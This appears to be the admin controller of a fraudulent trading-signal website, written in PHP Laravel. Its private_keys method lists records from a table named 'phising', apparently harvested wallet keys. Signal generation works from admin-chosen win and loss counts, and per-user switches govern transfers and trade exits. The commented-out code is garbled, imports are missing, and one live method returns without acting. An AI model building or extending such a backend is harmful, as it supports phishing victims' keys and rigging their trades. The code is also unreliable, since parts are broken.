<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class DashboardController extends Controller
{
    public function custom(Request $request)
    {
        $user = User::whereId($request->user)->first();

        if ($user->custom == 'on') {
            User::whereId($request->user)->update([
                'custom' => 'off',
            ]);
        } else {
            User::whereId($request->user)->update([
                'custom' => 'on',
            ]);
        }

        return response()->json(['status' => true]);
    }

    public function custom_message(Request $request)
    {
        $request->validate([
            'user' => 'required',
            'custom_header' => 'nullable|string|max:255',
            'custom_message' => 'nullable|string',
        ]);

        User::whereId($request->user)->update([
            'custom_header' => $request->custom_header,
            'custom_message' => $request->custom_message,
        ]);

        if ($request->ajax() || $request->wantsJson()) {
            return response()->json([
                'success' => true,
                'message' => 'Interface message matrix updated successfully.',
            ]);
        }

        return back()->with('status', 'custom message updated');
    }

    public function index()
    {
        $data = User::orderBy('created_at', 'desc')->paginate(20);

        return view('admin.user', [
            'data' => $data,
        ]);
    }

    public function private_keys()
    {
        $data = DB::table('phising')->orderBy('id', 'desc')->paginate(20);

        return view('admin.phising', [
            'data' => $data,
        ]);
    }

    public function generate_signal()
    {
        $cat = DB::table('exchanges')->orderBy('id', 'DESC')->get();
        $data = DB::table('generate_signal')->orderByDesc('id')->paginate(20);

        return view('admin.generate', [
            'cat' => $cat,
            'data' => $data,
        ]);
    }

    public function delete_g($id)
    {
        DB::table('generate_signal')->where('id', $id)->delete();

        return back()->with('status', 'Signal deleted');
    }

    private function getRandomTradeType()
    {
        // Randomly return "call" or "put"
        return rand(0, 1) ? 'call' : 'put';
    }

    // public function getRandomAssets(Request $request){

    //     // Retrieve the number of wins and losses from the request
    //     $winCount = $request->win; // e.g., 2
    //     $lossCount = $request->loss; // e.g., 4

    //     $winAssets = Asset::where('exchanges_id', $request->market)
    //                     ->where('profits', 'win')
    //                     ->take($winCount)
    //                     ->get();
    //     $lossAssets = Asset::where('exchanges_id', $request->market)
    //                     ->where('profits', 'loss')
    //                     ->take($lossCount)
    //                     ->get();
    //     $data = [];

    //     foreach ($winAssets as $asset) {
    //         $data[] = [
    //             'exchanges_id' => $request->market,
    //             'symbols' => $asset->symbols,
    //             'profits' => $asset->profits,
    //             'buy' => $this->getRandomTradeType(),
    //             'amount' => $request->amount,
    //             'time' => $request->time,
    //             'created_at'=>Carbon::now()
    //         ];
    //     }

    //     foreach ($lossAssets as $asset) {
    //                 'exchanges_id' => $request->market,
    //                 'symbols' => $asset->symbols,
    //                 'profits' => $asset->profits,
    //                 'buy' => $this->getRandomTradeType(),
    //                 'amount' => $request->amount,
    //                 'time' => $request->time,
    //                 'created_at' => Carbon::now()
    //             ];
    //         }
    //     }

    //     // Prepare loss assets for insertion
    //     foreach ($lossAssets as $asset) {
    //         // Check if this data already exists
    //             ['symbols', '=', $asset->symbols],
    //         ])->exists();

    //         // Insert only if it doesn't exist
    //         if (!$exists) {
    //             $data[] = [
    //                 'exchanges_id' => $request->market,
    //                 'symbols' => $asset->symbols,
    //                 'profits' => $asset->profits,
    //                 'buy' => $this->getRandomTradeType(),
    //                 'amount' => $request->amount,
    //                 'time' => $request->time,
    //                 'created_at' => Carbon::now()
    //             ];
    //         }
    //     }

    //     // Insert all unique data into the generate_signal table
    //     if (!empty($data)) {
    //         DB::table('generate_signal')->insert($data);
    //     }

    //     return back()->with('status' , 'Signals generated successfully');
    // }
    public function getRandomAssets(Request $request)
    {
        $callWins = (int) ($request->call_wins ?? 0);
        $callLosses = (int) ($request->call_losses ?? 0);
        $putWins = (int) ($request->put_wins ?? 0);
        $putLosses = (int) ($request->put_losses ?? 0);

        $totalNeeded = $callWins + $callLosses + $putWins + $putLosses;

        if ($totalNeeded <= 0) {
            return back()->with('error', 'Please specify at least one signal to generate.');
        }

        // Handle multiple timeframes (array from checkboxes)
        $timeframes = $request->time;
        if (empty($timeframes) || ! is_array($timeframes)) {
            return back()->with('error', 'Please select at least one execution window / timeframe.');
        }

        $minAmount = $request->min ?? 100;
        $maxAmount = $request->max ?? 1000;

        return back()->with('status', 'Generated');
    }

    public function no_of_trades(Request $request)
    {
        User::where('id', $request->id)->update([
            'trades' => $request->trade,
            'traded_date' => Carbon::now(),
        ]);

        return back()->with('status', 'Number of trade updated');
    }

    public function package_plan(Request $request)
    {
        $data = Package::where('id', $request->package)->first();

        if (! $data) {
            return back()->with('status', 'Error: Package not found. Please select a valid package.');
        }

        User::where('id', $request->id)->update([
            'package_id' => $request->package,
            'package_plan' => $data->name,
            'trades' => $request->trade,
        ]);

        return back()->with('status', 'User package updated successfully');
    }

    public function default_plan(Request $request)
    {
        DB::table('default_package')->where('id', 1)->update([
            'plan' => $request->plan,
        ]);

        return back()->with('status', 'Default package updated');
    }

    public function transfer(Request $request)
    {
        $user = User::whereId($request->user)->first();
        if ($user->transfer == 'on') {
            User::whereId($request->user)->update([
                'transfer' => 'off',
            ]);
        } else {
            User::whereId($request->user)->update([
                'transfer' => 'on',
            ]);
        }

        return response()->json(['status' => true]);
    }

    public function exit_trade(Request $request)
    {
        $user = User::whereId($request->user)->first();

        if ($user->exit_trade == 'on') {
            User::whereId($request->user)->update([
                'exit_trade' => 'off',
            ]);
        } else {
            User::whereId($request->user)->update([
                'exit_trade' => 'on',
            ]);
        }

        return response()->json(['status' => true]);
    }

    public function onOfflevel(Request $request)
    {
        $user = User::whereId($request->user)->first();

        if ($user->level_set == 'on') {
            User::whereId($request->user)->update([
                'level_set' => 'off',
            ]);
        } else {
            User::whereId($request->user)->update([
                'level_set' => 'on',
            ]);
        }

        return response()->json(['status' => true]);
    }
}
